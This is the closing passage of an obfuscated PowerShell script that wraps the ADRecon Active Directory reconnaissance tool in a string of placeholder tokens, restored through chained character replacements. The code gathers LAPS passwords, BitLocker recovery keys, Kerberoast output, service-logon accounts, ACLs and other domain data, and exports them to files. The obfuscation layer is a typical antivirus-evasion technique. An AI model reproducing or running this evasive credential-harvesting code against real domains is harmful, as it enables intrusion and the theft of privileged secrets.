        Get-ADRDNSZone -Method 5I7ELMethod -objDomain 5I7ELobjDomain -DomainController 5I7ELDomainController -Credential 5I7ELCredential -PageSize 5I7ELPageSize -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRDNSZones 5I7ELADRDNSZones -ADRDNSRecords 5I7ELADRDNSRecords
        Remove-Variable ADRDNSZones
    }
    If (5I7ELADRPrinters)
    {
        Write-Output I2aj[-] PrintersI2aj
        5I7ELADRObject = Get-ADRPrinter -Method 5I7ELMethod -objDomain 5I7ELobjDomain -PageSize 5I7ELPageSize -Threads 5I7ELThreads
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajPrintersI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPrinters
    }
    If (5I7ELADRComputers -or 5I7ELADRComputerSPNs)
    {
        If (!5I7ELADRComputerSPNs)
        {'+'
            Write-Output I2aj[-] Computers - May take some timeI2aj
            5I7ELADRComputerSPNs = 5I7ELfalse
        }
        ElseIf (!5I7ELADRComputers)
        {
            Write-Output I2aj[-] Computer SPNsI2aj
            5I7ELADRComputers = 5I7ELfalse
        }
        Else
        {
            Write-Output I2aj[-] Computers and SPNs - May take some timeI2aj
        }
        Get-ADRComputer -Method 5I7ELMethod -date 5I7ELdate -objDomain 5I7ELobjDomain -DormantTimeSpan 5I7ELDormantTimeSpan -PassMaxAge 5I7ELPassMaxAge -PageSize 5I7ELPageSize -Threads 5I7ELThreads -ADRComputers 5I7ELADRComputers -ADRComputerSPNs 5I7ELADRComputerSPNs
        Remove-Variable ADRComputers
        Remove-Variable ADRComputerSPNs
    }
    If (5I7ELADRLAPS'+')
    {
        Write-Output I2aj[-] LAPS - Needs Privileged AccountI2aj
        5I7ELADRObject = Get-ADRLAPSCheck -Method 5I7ELMethod -objDomain 5I7ELobjDomain -PageSize 5I7ELPageSize -Threads 5I7ELThreads
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajLAPSI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRLAPS
    }
    If (5I7ELADRBitLocker)
    {
        Write-Output I2aj[-] BitLocker Recovery Keys - Needs Privileged AccountI2aj
        5I7ELADRObject = Get-ADRBitLocker -Method 5I7ELMethod -objDomain 5I7ELobjDomain -DomainController 5I7ELDomainController -Credential 5I7ELCredential
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajBitLockerRecoveryKeysI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRBitLocker
    }
    If (5I7ELADRACLs)
    {
        Write-Output I2aj[-] ACLs - May take some timeI2aj
        5I7ELADRObject = Get-ADRACL -Method 5I7ELMethod -objDomain 5I7ELobjDomain -Do'+'mainController 5I7ELDomainController -Credential 5I7ELCredential -PageSize 5I7ELPageSize -Threads 5I7ELThreads
        Remove-Variable ADRACLs
    }
    If (5I7ELADRGPOReport)
    {
        Write-Output I2aj[-] GPOReport - May take some timeI2aj
        Get-ADRGPOReport -Method 5I7ELMethod -UseAltCreds 5I7ELUseAltCreds -ADROutputDir 5I7ELADROutputDir
        Remove-Variable ADRGPOReport
    }
    If (5I7ELADRKerberoast)
    {
        Write-Output I2aj[-] KerberoastI2aj
        5I7ELADRObject = Get-ADRKerberoast -Method 5I7ELMethod -objDomain 5I7ELobjDomain -Credential 5I7ELCredential -PageSize 5I7ELPageSize
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajKerberoastI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRKerberoast
    }
    If (5I7ELADRDomainAccountsusedforServiceLogon)
    {
        Write-Output I2aj[-] Domain Accounts used for Service Logon - Needs Privileged AccountI2aj
        5I7ELADRObject = Get-ADRDomainAccountsusedforServiceLogon -Method 5I7ELMethod -objDomain 5I7ELobjDomain -Credential 5I7ELCredential -PageSize 5I7ELPageSize -Threads 5I7ELThreads
        If (5I7ELADRObject)
        {
            Export-ADR -ADRObj 5I7ELADRObject -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajDomainAccountsusedforServiceLogonI2aj
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomainAccountsusedforServiceLogon
    }

    5I7ELTotalTime = I2aj{0:N2}I2aj -f ((Get-DateDiff -Date1 (Get-Date) -Date2 5I7ELdate).TotalMinutes)

    5I7ELAboutADRecon = Get-ADRAbout -Method 5I7ELMethod -date 5I7ELdate -ADReconVersion 5I7ELADReconVersion -Credential 5I7ELCredential -RanonComputer 5I7ELRanonComputer -TotalTime 5I7ELTotalTime

    If ( (5I7ELOutputType -Contains I2ajCSVI2aj) -or (5I7ELOutputType -Contains I2ajXMLI2aj) -or (5I7ELOutputType -Contains I2ajJSONI2aj) -or (5I7ELOutputType -Contains I2ajHTMLI2aj) )
    {
        If (5I7ELAboutADRecon)
        {
            Export-ADR -ADRObj 5I7ELAboutADRecon -ADROutputDir 5I7ELADROutputDir -OutputType 5I7ELOutputType -ADRModuleName I2ajAboutADReconI2aj
        }
        Write-Output I2aj[*] Total Execution Time (mins): 5I7EL(5I7ELTotalTime)I2aj
        Write-Output I2aj[*] Output Directory: 5I7ELADROutputDirI2aj
        5I7ELADRSTDOUT = 5I7ELfalse
    }

    Switch (5I7ELOutputType)
    {
        JQTOySTDOUTJQTOy
        {
            If (5I7ELADRSTDOUT)
            {
                Write-Output I2aj[*] Total Execution Time (mins): 5I7EL(5I7ELTotalTime)I2aj
            }
        }
        JQTOyHTMLJQTOy
        {
            Export-ADR -ADRObj 5I7EL(New-Object PSObject) -ADROutputDir 5I7ELADROutputDir -OutputType 5I7EL([array] I2ajHTMLI2aj) -ADRModuleName I2ajIndexI2aj
        }
        JQTOyEXCELJQTOy
        {
            Export-ADRExcel 5I7ELADROutputDir
        }
    }
    Remove-Variable TotalTime
    Remove-Variable AboutADRecon
    Set-Location 5I7ELreturndir
    Remove-Variable returndir

    If ((5I7ELMethod -eq JQTOyADWSJQTOy) -and 5I7ELUseAltCreds)
    {
        Remove-PSDrive ADR
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELobjDomain.Dispose()
        5I7ELobjDomainRootDSE.Dispose()
    }

    If (5I7ELADROutputDir)
    {
        Remove-EmptyADROutputDir 5I7ELADROutputDir 5I7ELOutputType
    }

    Remove-Variable ADReconVersion
    Remove-Variable RanonComputer
}

If (5I7ELLog)
{
    Start-Transcript -Path'+' I2aj5I7EL(Get-Location)COlhgADRecon-Console-Log.txtI2aj
}

Invoke-ADRecon -GenExcel 5I7ELGenExcel -Method 5I7ELMethod -Collect 5I7ELCollect -DomainController 5I7ELDomainController -Credential 5I7ELCredential -OutputType 5I7ELOutputType -ADROutputDir 5I7ELOutputDir -DormantTimeSpan 5I7ELDormantTimeSpan -PassMaxAge 5I7ELPassMaxAge -PageSize 5I7ELPageSize -Threads 5I7ELThreads

If (5I7ELLo'+'g)
{
    Stop-Transcript
}

').rEPLACE(([cHaR]79+[cHaR]107+[cHaR]54+[cHaR]114+[cHaR]108),[string][cHaR]124).rEPLACE('JQTOy',[string][cHaR]39).rEPLACE('5I7EL',[string][cHaR]36).rEPLACE(([cHaR]70+[cHaR]75+[cHaR]104+[cHaR]65+[cHaR]74),'`').rEPLACE(([cHaR]67+[cHaR]79+[cHaR]108+[cHaR]104+[cHaR]103),[string][cHaR]92).rEPLACE(([cHaR]73+[cHaR]50+[cHaR]97+[cHaR]106),[string][cHaR]34) )
